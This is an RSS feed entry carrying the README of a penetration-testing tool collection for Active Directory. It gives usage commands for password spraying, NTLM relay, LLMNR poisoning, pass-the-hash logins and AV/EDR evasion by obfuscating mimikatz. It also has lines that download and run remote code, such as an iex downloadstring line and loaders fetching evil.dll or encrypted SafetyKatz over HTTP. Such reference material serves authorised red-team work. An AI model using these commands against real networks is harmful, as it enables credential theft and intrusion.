<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PowerShell Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-07-23T01:50:57Z</updated>
  <subtitle>Daily Trending of PowerShell in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>LuemmelSec/Pentest-Tools-Collection</title>
    <updated>2022-07-23T01:50:57Z</updated>
    <id>tag:github.com,2022-07-23:/LuemmelSec/Pentest-Tools-Collection</id>
    <link href="https://github.com/LuemmelSec/Pentest-Tools-Collection" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Pentest-Tools-Collection&lt;/h1&gt; &#xA;&lt;h2&gt;Active Directory&lt;/h2&gt; &#xA;&lt;h3&gt;AMSI&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://amsi.fail/&#34;&gt;https://amsi.fail/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Tool Collections&lt;/h3&gt; &#xA;&lt;h4&gt;WinPwn&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/S3cur3Th1sSh1t/WinPwn&#34;&gt;https://github.com/S3cur3Th1sSh1t/WinPwn&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Import-Module .\WinPwn.ps1&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;iex(new-object net.webclient).downloadstring(&#39;https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1&#39;)&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Ghostpack&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/GhostPack&#34;&gt;https://github.com/GhostPack&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Seatbelt, KeeThief, Rubeus, SharpUp ...&lt;/p&gt; &#xA;&lt;h4&gt;Powersploit&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit&#34;&gt;https://github.com/PowerShellMafia/PowerSploit&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;PowerView, PowerUp, Get-GPPPassword ...&lt;/p&gt; &#xA;&lt;h3&gt;Enumeration&lt;/h3&gt; &#xA;&lt;h4&gt;Bloodhound&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/BloodHoundAD/BloodHound&#34;&gt;https://github.com/BloodHoundAD/BloodHound&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;SharpHound.exe -d testdomain.com -c all,gpolocalgroup&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Sharphound.ps1 -d testdomain.com -c all,gpolocalgroup&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/fox-it/BloodHound.py&#34;&gt;https://github.com/fox-it/BloodHound.py&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;bloodhound.py -c all&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h4&gt;ADRecon&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/adrecon/ADRecon&#34;&gt;https://github.com/adrecon/ADRecon&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;To run ADRecon on a domain member host.&lt;br&gt; &lt;code&gt;PS C:\&amp;gt; .\ADRecon.ps1&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;To run ADRecon on a domain member host as a different user.&lt;br&gt; &lt;code&gt;PS C:\&amp;gt;.\ADRecon.ps1 -DomainController &amp;lt;IP or FQDN&amp;gt; -Credential &amp;lt;domain\username&amp;gt;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;To run ADRecon on a non-member host using LDAP.&lt;br&gt; &lt;code&gt;PS C:\&amp;gt;.\ADRecon.ps1 -Method LDAP -DomainController &amp;lt;IP or FQDN&amp;gt; -Credential &amp;lt;domain\username&amp;gt;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Spraying-Toolkit&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/byt3bl33d3r/SprayingToolkit&#34;&gt;https://github.com/byt3bl33d3r/SprayingToolkit&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Lync/Skype &amp;amp; OWA sprayer, wordlist-generator, naming scheme converter etc.&lt;/p&gt; &#xA;&lt;p&gt;Spraying OWA&lt;br&gt; &lt;code&gt;./atomizer.py owa contoso.com &#39;Fall2018&#39; emails.txt&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Spraying Lync&lt;br&gt; &lt;code&gt;./atomizer lync contoso.com --user-as-pass usernames.txt&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Recon mode&lt;br&gt; &lt;code&gt;./atomizer owa &#39;https://owa.contoso.com/autodiscover/autodiscover.xml&#39; --recon&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h4&gt;MailSniper&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/dafthack/MailSniper&#34;&gt;https://github.com/dafthack/MailSniper&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Attack OWA &amp;amp; EWS&lt;br&gt; Namingscheme should be like testdomain.com\schmidta or aschmidt -&amp;gt; check scheme with msf module&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile owa-sprayed-creds.txt&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Get-ADUsernameFromEWS -EmailList email-list.txt&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016 -OutFile global-address-list.txt&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h4&gt;msspray&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/0xZDH/msspray&#34;&gt;https://github.com/0xZDH/msspray&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;O365 Enum &amp;amp; Spray Tool&lt;/p&gt; &#xA;&lt;p&gt;Just Enum Users without spraying. Needs a textfile with complete mailadresses &lt;a href=&#34;mailto:user@company.com&#34;&gt;user@company.com&lt;/a&gt;&lt;br&gt; &lt;code&gt;python3 msspray.py -e -u textfile.txt --wait 10 --verbose&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h4&gt;MSOLSpray&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/dafthack/MSOLSpray&#34;&gt;https://github.com/dafthack/MSOLSpray&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;O365 Sprayer&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Import-Module MSOLSpray.ps1&lt;/code&gt;&lt;br&gt; &lt;code&gt;Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h4&gt;ExchangeRelayX&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/quickbreach/ExchangeRelayX&#34;&gt;https://github.com/quickbreach/ExchangeRelayX&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Attack EWS via NTLM Authentication over HTTP.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;./exchangeRelayx.py -t https://mail.quickbreach.com&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h4&gt;SharpView&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/tevora-threat/SharpView&#34;&gt;https://github.com/tevora-threat/SharpView&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Port of PowerView to .NET&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;SharpView.exe Get-DomainController -Domain test.local -Server dc.test.local -Credential admin@test.local/password&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h4&gt;CrossLinked&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/m8r0wn/CrossLinked&#34;&gt;https://github.com/m8r0wn/CrossLinked&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Gather Mailadresses / Users&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;python3 crosslinked.py -f &#39;{first}.{last}@domain.com&#39; company_name&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Post Exploitation&lt;/h3&gt; &#xA;&lt;h4&gt;impacket&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;https://github.com/SecureAuthCorp/impacket&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Crackmapexec&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/byt3bl33d3r/CrackMapExec&#34;&gt;https://github.com/byt3bl33d3r/CrackMapExec&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Official Docu: &lt;a href=&#34;https://mpgn.gitbook.io/crackmapexec/&#34;&gt;https://mpgn.gitbook.io/crackmapexec/&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;SharpGPOAbuse&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/FSecureLABS/SharpGPOAbuse&#34;&gt;https://github.com/FSecureLABS/SharpGPOAbuse&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h4&gt;EvilWinRM&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/mrnamp/EvilWinRM&#34;&gt;https://github.com/mrnamp/EvilWinRM&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;A tool to interact with MicrosoftÂ´s WS-Management implementation aka Powershell-Remoting from a Linux box.&lt;br&gt; Can also be used to connect with a hash instead of password.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p &#39;MySuperSecr3tPass123!&#39;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -H B3D7E7E1516FFBFCB1C54A4C349BC099&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Also capable of executing C#, DLLs or donut shellcode afterwards directly in memory. The executables must be in the path set at -e argument.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Invoke-Binary /opt/csharp/Binary.exe &#39;param1, param2, param3&#39;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Dll-loader -http -path http://10.11.12.13/evil.dll&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Donut-Loader -process_id 1234 -donutfile /use/share/payload.bin&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Can also bypass AMSI, fetch Kerberos tickets and so on ...&lt;/p&gt; &#xA;&lt;h4&gt;SharpRDP&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/rasta-mouse/SharpRDP&#34;&gt;https://github.com/rasta-mouse/SharpRDP&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Execute stuff over RDP. User will get a notification if multi-RDP is not enabled!&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;SharpRDP.exe computername=target.domain command=&#34;C:\Temp\file.exe&#34; username=domain\user password=password&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Inveigh&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Kevin-Robertson/Inveigh&#34;&gt;https://github.com/Kevin-Robertson/Inveigh&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;PowerShell ADIDNS/LLMNR/mDNS/NBNS/DNS spoofer and man-in-the-middle tool&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Import-Module Inveigh.psm1&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Invoke-Inveigh -Consoleoutput Y&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h4&gt;Responder&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/lgandx/Responder&#34;&gt;https://github.com/lgandx/Responder&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;LLMNR/NBT-NS/mDNS Poisoner&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;./Responder.py -I eth0&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h2&gt;C2&lt;/h2&gt; &#xA;&lt;h3&gt;Covenant&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/cobbr/Covenant&#34;&gt;https://github.com/cobbr/Covenant&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;PS-Empire&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/BC-SECURITY/Empire&#34;&gt;https://github.com/BC-SECURITY/Empire&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;PrivEsc&lt;/h2&gt; &#xA;&lt;h3&gt;WinPEAS / LinPEAS&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite&#34;&gt;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;SecWiki&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/SecWiki&#34;&gt;https://github.com/SecWiki&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Exploits for Linux &amp;amp; Windows&lt;/p&gt; &#xA;&lt;h3&gt;PowerShDll&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/p3nt4/PowerShdll&#34;&gt;https://github.com/p3nt4/PowerShdll&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Powershell without Powershell&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;rundll32 PowerShdll,main -w&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;PowerUpSQL&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/NetSPI/PowerUpSQL&#34;&gt;https://github.com/NetSPI/PowerUpSQL&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;UACME&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/hfiref0x/UACME&#34;&gt;https://github.com/hfiref0x/UACME&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Watson&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/rasta-mouse/Watson&#34;&gt;https://github.com/rasta-mouse/Watson&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;PrivescCheck&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/itm4n/PrivescCheck&#34;&gt;https://github.com/itm4n/PrivescCheck&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Obfuscation&lt;/h2&gt; &#xA;&lt;h3&gt;PEzor&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/phra/PEzor&#34;&gt;https://github.com/phra/PEzor&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Obfuscate C / C++ binaries&lt;/p&gt; &#xA;&lt;p&gt;New module -&amp;gt; ShellCode fluctuation:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;PEzor -fluctuate=RW -debug mimikatz.exe -p &#39;&#34;coffee&#34; &#34;sleep 5000&#34; &#34;coffee&#34; &#34;exit&#34;&#39;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://twitter.com/phraaaaaaa/status/1453389564383404032?t=wcB-3NlNh9725L9_zRjdHg&#34;&gt;https://twitter.com/phraaaaaaa/status/1453389564383404032?t=wcB-3NlNh9725L9_zRjdHg&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Donut Syscall fork&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/S4ntiagoP/donut/tree/syscalls&#34;&gt;https://github.com/S4ntiagoP/donut/tree/syscalls&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Fork of Donut shellcode / PE generator with syscalls&lt;/p&gt; &#xA;&lt;h3&gt;amber&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/EgeBalci/amber&#34;&gt;https://github.com/EgeBalci/amber&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Obfuscate C / C++ binaries&lt;/p&gt; &#xA;&lt;h3&gt;Invoke-Obfuscation&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/danielbohannon/Invoke-Obfuscation&#34;&gt;https://github.com/danielbohannon/Invoke-Obfuscation&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Obfuscator for PowerShell scripts.&lt;/p&gt; &#xA;&lt;h3&gt;xencrypt / BetterXencrypt&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/the-xentropy/xencrypt&#34;&gt;https://github.com/the-xentropy/xencrypt&lt;/a&gt; / &lt;a href=&#34;https://github.com/GetRektBoy724/BetterXencrypt&#34;&gt;https://github.com/GetRektBoy724/BetterXencrypt&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;AQUARMOURY (in special wraith)&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/slaeryan/AQUARMOURY&#34;&gt;https://github.com/slaeryan/AQUARMOURY&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Collection of Tools to bypass AV/EDR and stuff&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Import-Module ./xencrypt.ps1&#xA;Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile xenmimi.ps1&#xA;Invoke-Xencrypt -InFile invoke-mimikatz.ps1 -OutFile xenmimi.ps1 -Iterations 100&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Obfuscator and encrypter for PowerShell scripts.&lt;/p&gt; &#xA;&lt;h3&gt;ISESteroids&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.powershellgallery.com/packages/ISESteroids/2.7.1.7&#34;&gt;https://www.powershellgallery.com/packages/ISESteroids/2.7.1.7&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Tools collection for PowerShell ISE. Obfuscation possibilities.&lt;/p&gt; &#xA;&lt;h3&gt;PS2EXE&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://gallery.technet.microsoft.com/scriptcenter/PS2EXE-GUI-Convert-e7cb69d5&#34;&gt;https://gallery.technet.microsoft.com/scriptcenter/PS2EXE-GUI-Convert-e7cb69d5&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Convert PS1 to EXE file.&lt;/p&gt; &#xA;&lt;h3&gt;Invoke-Sharploader&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader&#34;&gt;https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;A wrapper for C# binaries that encrypts the payload and decrypts it in memory.&lt;/p&gt; &#xA;&lt;p&gt;Encrypt binary:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Invoke-SharpEncrypt -file C:\CSharpFiles\SafetyKatz.exe -password S3cur3Th1sSh1t -outfile C:\CSharpEncrypted\SafetyKatz.enc&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Load encrypted binary from URL:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Invoke-SharpLoader -location https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-SharpLoader/master/EncryptedCSharp/SafetyKatz.enc -password S3cur3Th1sSh1t -noArgs&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Load encrypted binary from disk with commandline arguments:&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;Invoke-SharpLoader -location C:\EncryptedCSharp\Rubeus.enc -password S3cur3Th1sSh1t -argument kerberoast -argument2 &#34;/format:hashcat&#34;&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h3&gt;inceptor&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/klezVirus/inceptor&#34;&gt;https://github.com/klezVirus/inceptor&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Obfuscator for C# and Powershell&lt;/p&gt; &#xA;&lt;h3&gt;Chimera&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/tokyoneon/Chimera&#34;&gt;https://github.com/tokyoneon/Chimera&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;PowerShell Script obfuscator&lt;/p&gt; &#xA;&lt;h3&gt;InvisibilityCloak&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/xforcered/InvisibilityCloak&#34;&gt;https://github.com/xforcered/InvisibilityCloak&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;C# assembly obfuscator&lt;/p&gt; &#xA;&lt;h3&gt;Charlotte&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/9emin1/charlotte&#34;&gt;https://github.com/9emin1/charlotte&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Shellcode Loader via D-Invoke&lt;/p&gt; &#xA;&lt;h3&gt;AVCleaner&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/lleon1435/avcleaner&#34;&gt;https://github.com/lleon1435/avcleaner&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;C/C++ source obfuscator&lt;/p&gt; &#xA;&lt;h2&gt;Misc&lt;/h2&gt; &#xA;&lt;p&gt;SharpSploit: &lt;a href=&#34;https://github.com/cobbr/SharpSploit&#34;&gt;https://github.com/cobbr/SharpSploit&lt;/a&gt;&lt;br&gt; ZeroLogon-Tester: &lt;a href=&#34;https://github.com/BC-SECURITY/Invoke-ZeroLogon&#34;&gt;https://github.com/BC-SECURITY/Invoke-ZeroLogon&lt;/a&gt; / &lt;a href=&#34;https://github.com/SecuraBV/CVE-2020-1472&#34;&gt;https://github.com/SecuraBV/CVE-2020-1472&lt;/a&gt;&lt;br&gt; Ligolo: &lt;a href=&#34;https://github.com/sysdream/ligolo&#34;&gt;https://github.com/sysdream/ligolo&lt;/a&gt;&lt;br&gt; Metasploit: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework&#34;&gt;https://github.com/rapid7/metasploit-framework&lt;/a&gt;&lt;br&gt; Socat: &lt;a href=&#34;https://github.com/craSH/socat&#34;&gt;https://github.com/craSH/socat&lt;/a&gt;&lt;br&gt; ThreatCheck: &lt;a href=&#34;https://github.com/rasta-mouse/ThreatCheck&#34;&gt;https://github.com/rasta-mouse/ThreatCheck&lt;/a&gt;&lt;br&gt; evilginx2: &lt;a href=&#34;https://github.com/kgretzky/evilginx2&#34;&gt;https://github.com/kgretzky/evilginx2&lt;/a&gt;&lt;br&gt; O365 Enum: &lt;a href=&#34;https://github.com/gremwell/o365enum&#34;&gt;https://github.com/gremwell/o365enum&lt;/a&gt;&lt;br&gt; O365 spray: &lt;a href=&#34;https://github.com/0xZDH/o365spray&#34;&gt;https://github.com/0xZDH/o365spray&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Web&lt;/h1&gt; &#xA;&lt;p&gt;JSFScan: &lt;a href=&#34;https://github.com/KathanP19/JSFScan.sh&#34;&gt;https://github.com/KathanP19/JSFScan.sh&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
</feed>